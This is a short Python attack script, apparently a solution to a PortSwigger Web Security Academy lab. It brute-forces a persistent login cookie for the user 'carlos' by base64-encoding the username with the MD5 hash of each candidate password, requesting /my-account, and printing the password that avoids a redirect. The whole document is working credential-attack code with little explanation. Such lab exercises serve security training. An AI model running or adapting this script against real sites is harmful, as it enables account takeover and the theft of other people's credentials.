from lib import *

req = FartRequest("""
GET /my-account HTTP/1.1
Host: 0ade004a035c73dac543e8a70065008e.web-security-academy.net
Cookie: stay-logged-in={b64e("carlos:"+md5("pwd"))}
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0ade004a035c73dac543e8a70065008e.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

""")

response = HttpWorker(req.substitute(pwd=passwords)).get_first(lambda x: x.status_code != 302)

password = passwords[response.index]
print("found creds:", "carlos", password)
